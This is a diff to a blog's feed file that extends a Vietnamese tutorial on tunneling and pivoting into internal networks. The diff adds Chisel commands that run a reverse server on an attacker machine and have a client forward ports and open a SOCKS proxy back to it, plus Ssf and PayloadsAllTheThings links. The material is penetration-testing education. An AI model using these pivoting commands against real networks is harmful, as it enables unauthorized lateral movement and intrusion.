@@ -15,7 +15,7 @@
             <pubDate>Fri, 30 Jul 2021 00:00:00 +0000</pubDate>
             
             <guid>https://tranquac.github.io/posts/2021/07/tunneling-pivoting-to-attack-internal-network/</guid>
-            <description>Intro Tools for tunneling  SSH Tunnel  Local Port Porwarding Remote Port Porwarding Dynamic Port Porwarding Sshuttle   Netword Layer Tunnel Transport Layer Tunnel Application Layer Tunnel Metasploit Framework   Create SOCKS Proxy to Attack Internal Network Refer  Intro   Có rất nhiều bài viêt,blog nói về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, các nguyên tắc, tình huống ít được đề cập, giải thích nhiều.</description>
+            <description>Intro Tools for tunneling  SSH Tunnel  Local Port Porwarding Remote Port Porwarding Dynamic Port Porwarding Sshuttle   Netword Layer Tunnel Transport Layer Tunnel Application Layer Tunnel Other tools pivoting without SSH  Metasploit Framework Chisel Ssf     Create SOCKS Proxy to Attack Internal Network Refer  Intro   Có rất nhiều bài viêt,blog nói về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, các nguyên tắc, tình huống ít được đề cập, giải thích nhiều.</description>
             <content type="html"><![CDATA[<ul>
 <li><a href="#Intro">Intro</a></li>
 <li><a href="#tools-for-tunneling">Tools for tunneling</a>
@@ -31,7 +31,13 @@
 <li><a href="#netword-layer-tunnel">Netword Layer Tunnel</a></li>
 <li><a href="#transport-layer-tunnel">Transport Layer Tunnel</a></li>
 <li><a href="#application-layer-tunnel">Application Layer Tunnel</a></li>
+<li><a href="#other-tools-pivoting-without-ssh">Other tools pivoting without SSH</a>
+<ul>
 <li><a href="#metasploit-framework">Metasploit Framework</a></li>
+<li><a href="#chisel">Chisel</a></li>
+<li><a href="#ssf">Ssf</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="#create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</a></li>
@@ -273,7 +279,8 @@ socks4 127.0.0.1 <span style="color:#ae81ff">8080</span>
 </ul>
 </li>
 </ul>
-<h3 id="metasploit-framework">Metasploit Framework</h3>
+<h3 id="other-tools-pivoting-without-ssh">Other tools pivoting without SSH</h3>
+<h4 id="metasploit-framework">Metasploit Framework</h4>
 <ul>
 <li>Khi có shell meterpreter bạn hoàn toàn có thể sử dụng để tạo tunnel dễ dàng. Không cần phải có thông tin đăng nhập giống SSH. Với SSH ta phải có một tài khoản đăng nhập hay private-key SSH của server thì mới có thể kết nối đến và tạo tunnel.</li>
 </ul>
@@ -298,6 +305,44 @@ meterpreter &gt;
 <li>Liệt kê tất cả tunnel : <code>meterpreter &gt; portfwd list</code></li>
 <li>Xóa tất cả tunnel : <code>portfwd flush</code></li>
 <li>Xem chi tiết hơn tại : <a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></li>
+</ul>
+<h4 id="chisel">Chisel</h4>
+<ul>
+<li>A fast TCP/UDP tunnel over HTTP (<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>)</li>
+<li>Sử dụng thông thường: Ví dụ Kali hoặc máy tấn công khác có IP là 10.10.15.13, máy client có IP là 10.10.10.10.</li>
+<li>Trên máy tấn công bắt đầu tạo chisel server lắng nghe trên port 8000:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel server -p <span style="color:#ae81ff">8000</span> --reverse
+</code></pre></div><ul>
+<li>Trên máy client:
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>chisel client 10.10.15.13:8000 R:80:127.0.0.1:80 R:389:localhost:389</td>
+<td>Listen on Kali 80,389, forward to localhost port 80,389 on client</td>
+</tr>
+<tr>
+<td>chisel client 10.10.15.13:8000 R:4444:10.10.10.214:80</td>
+<td>Listen on Kali 4444, forward to 10.10.10.214 port 80</td>
+</tr>
+<tr>
+<td>chisel client 10.10.15.13:8000 R:socks</td>
+<td>Create SOCKS5 listener on 1080 on Kali, proxy through client</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>Lưu ý là Chisel phải chạy cả trên server và client</li>
+</ul>
+<h4 id="ssf">Ssf</h4>
+<ul>
+<li><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></li>
 </ul>
 <h2 id="create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</h2>
 <h3 id="ssh">Ssh</h3>
@@ -348,6 +393,7 @@ meterpreter &gt;
 <li><a href="https://blog.csdn.net/qq_34801745/article/details/109022922">https://blog.csdn.net/qq_34801745/article/details/109022922</a></li>
 <li><a href="https://www.ms509.com/2020/06/17/Intranet-penetration/">https://www.ms509.com/2020/06/17/Intranet-penetration/</a></li>
 <li><a href="https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/">https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md</a></li>
 </ul>
 ]]></content>
         </item>
